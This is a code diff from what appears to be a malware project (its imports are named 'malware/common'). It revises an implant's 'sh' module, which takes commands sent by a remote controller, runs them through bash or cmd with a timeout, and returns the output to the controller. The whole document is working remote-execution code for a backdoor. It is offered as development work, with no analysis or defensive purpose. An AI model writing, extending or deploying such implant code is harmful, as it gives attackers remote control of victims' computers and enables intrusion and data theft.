@@ -2,59 +2,64 @@
 package sh
 
 import (
-	"fmt"
+	"context"
 	"malware/common/messages"
 	"malware/common/types"
 	"os/exec"
 	"runtime"
 	"strings"
+	"time"
 )
 
-type state struct {
-	running bool
-}
+/**
+Takes a command and runs it in either bash or whatever windows calls bash
+*/
 
 type settings struct {
-	state *state // Tell our loop to stop
 }
 
 // Create creates an implementation of settings
 func Create() types.Module {
-	state := state{running: false}
-	return settings{&state}
+	return settings{}
 }
 
-func (settings settings) HandleMessage(message *messages.CheckCmdReply, callback func(*messages.ImplantReply)) bool {
-	cmd := message.GetExec()
-	if cmd == nil {
+func (settings settings) HandleMessage(message *messages.CheckCmdReply, callback func(*messages.CheckCmdRequest)) bool {
+	exe := message.GetExec()
+	if exe == nil {
 		return false
 	}
 
-	var out []byte
-	var err error
+	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second) // 5 second timeout
+	defer cancel()
 
+	var cmd *exec.Cmd
+
+	args := strings.Join(exe.Args, " ")
+
+	// We run the commands under bash/cmd so that pipes will work
 	if runtime.GOOS == "windows" {
-		args := strings.Join(cmd.Args, " ")
-		out, err = exec.Command("cmd", "/C", cmd.Exec+" "+args).Output()
+		cmd = exec.CommandContext(ctx, "cmd", "/C", exe.Exec+" "+args)
 	} else {
-		out, err = exec.Command(cmd.Exec, cmd.Args...).Output()
+		cmd = exec.CommandContext(ctx, "bash", "-c", exe.Exec+" "+args)
 	}
-	fmt.Println(err)
-	if err != nil {
-		callback(&messages.ImplantReply{Module: settings.ID(), Args: []byte(err.Error())})
+
+	out, err := cmd.CombinedOutput()
+
+	if ctx.Err() == context.DeadlineExceeded {
+		callback(messages.Implant_error(settings.ID(), types.ERR_CMD_TIMEOUT))
+	} else if err != nil {
+		callback(messages.Implant_data(settings.ID(), []byte(err.Error())))
 	} else {
-		callback(&messages.ImplantReply{Module: settings.ID(), Args: out})
+		callback(messages.Implant_data(settings.ID(), out))
 	}
+
 	return true
 }
 
 // Init the state of this module
 func (settings settings) Init() {
-	settings.state.running = true
 }
-
 func (settings settings) Shutdown() {
-	settings.state.running = false
 }
 
 func (settings) ID() string { return "sh" }
